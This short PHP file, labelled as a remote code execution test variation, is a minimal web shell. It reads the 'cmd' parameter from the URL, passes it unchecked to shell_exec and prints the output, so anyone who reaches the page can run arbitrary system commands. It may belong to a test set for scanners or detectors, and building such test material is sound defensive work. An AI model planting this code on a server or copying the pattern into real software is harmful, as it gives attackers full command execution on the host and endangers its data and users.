<?php
// RCE test variation #70
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>